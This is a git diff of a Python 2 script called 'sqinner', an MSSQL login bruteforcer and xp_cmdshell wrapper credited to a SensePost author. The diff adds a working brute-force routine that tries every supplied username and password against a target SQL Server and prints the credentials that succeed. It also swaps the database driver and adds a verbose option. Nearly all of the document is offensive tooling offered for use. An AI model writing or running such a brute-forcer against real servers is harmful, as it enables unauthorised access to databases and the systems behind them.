@@ -1,30 +1,65 @@
 import argparse
-import pyodbc
+import _mssql
+
+program_info = {
+    'name': 'sqinner',
+    'description': 'A MSSQL service login bruteforcer xp_cmdshell wrapper',
+    'author': {
+        'name': 'Frank Allenby',
+        'email': 'frank@sensepost.com'
+    }
+}
+
+program_defaults = {
+    'service': 'SQL Server'
+}
+
+notices = {
+    'success': '[!]',
+    'fail': '[!]',
+    'info': '[?]'
+}
+
+
+def print_notice(notice, message):
+    print '%(notice)s %(message)s' % {'notice': notice, 'message': message}
+
+
+def notice_success(message):
+    print_notice(notices['success'], message)
+
+
+def notice_fail(message):
+    print_notice(notices['fail'], message)
+
+
+def notice_info(message):
+    print_notice(notices['info'], message)
 
 
 def print_headline():
-    print'''
-                                sqinner
-    A SQL service login bruteforcer and MSSQL xp_cmdshell wrapper
-                  Frank Allenby - frank@sensepost.com
-    '''
+    print '''
+    -
+    | %(name)s
+    |
+    | %(description)s
+    |
+    | %(author_name)s - %(author_email)s
+    -
+    ''' % {
+        'name': program_info['name'],
+        'description': program_info['description'],
+        'author_name': program_info['author']['name'],
+        'author_email': program_info['author']['email']
+    }
 
 
-def make_db_connection(driver, server, port, uid, pwd):
-    return pyodbc.connect(
-        'DRIVER={%(driver)s};\
-        SERVER=%(server)s;\
-        Port=%(port)d\
-        UID=%(uid)s;\
-        PWD=%(pwd)s;'
-        %
-        {
-            'driver': driver,
-            'server': server,
-            'port': port,
-            'uid': uid,
-            'pwd': pwd
-        }
+def make_db_connection(server, port, user, password):
+    return _mssql.connect(
+        server=server,
+        user=user,
+        password=password,
+        port=port
     )
 
 
@@ -33,6 +68,27 @@ def make_db_connection(driver, server, port, uid, pwd):
 def file_to_array(filename):
     with open(filename) as file:
         return [line.rstrip('\n') for line in file]
+
+
+def brute(usernames, passwords, verbose):
+    notice_info('Starting bruteforce with %(username_count)d username(s) and %(password_count)d password(s)' % {'username_count': len(usernames), 'password_count': len(passwords)})
+    print ' |'
+    for username in usernames:
+        for password in passwords:
+            conn = None
+            try:
+                conn = make_db_connection(args.target,
+                                          args.port,
+                                          username,
+                                          password)
+            except:
+                if verbose:
+                    notice_fail('Login failed with %(username)s : %(password)s' % {'username': username, 'password': password})
+                continue
+
+            if verbose:
+                print ' |'
+            notice_success('Login succeeded with %(username)s : %(password)s' % {'username': username, 'password': password})
 
 
 # Convert an argument to an array
@@ -52,8 +108,14 @@ def arg_to_array(argument):
     else:
         return [argument]
 
-parser = argparse.ArgumentParser(description='sqinner - SQL login bruteforcer\
-                                 and MSSQL xp_cmdshell wrapper')
+parser = argparse.ArgumentParser(
+    description='%(name)s - %(description)s'
+    %
+    {
+        'name': program_info['name'],
+        'description': program_info['description']
+    }
+)
 
 parser.add_argument(
     'target',
@@ -86,28 +148,20 @@ parser.add_argument(
 )
 
 parser.add_argument(
-    '-s',
-    '--service',
-    default='SQL Server',
-    help='The service you wish to bruteforce. This should be used if you wish\
-    to use something other than MSSQL. Note that anything other than "SQL\
-    Server" will disable the xp_cmdshell functionality.',
-    required=False
-)
-
-parser.add_argument(
-    '--horizontal',
+    '-v',
+    '--verbose',
     action='store_true',
-    help='Perform the bruteforce in a horizontal manner, iterating over\
-    passwords and then usernames, rather than usernames and then passwords'
+    help="Produce verbose output during %(program_name)s's operation"
+    % {'program_name': program_info['name']}
 )
 
 print_headline()
 
 args = parser.parse_args()
 
-shell_service = 'SQL Server'
-shell_enabled = (args.service == shell_service)
-
 usernames = arg_to_array(args.usernames)
 passwords = arg_to_array(args.passwords)
+
+verbose = args.verbose
+
+brute(usernames, passwords, verbose)
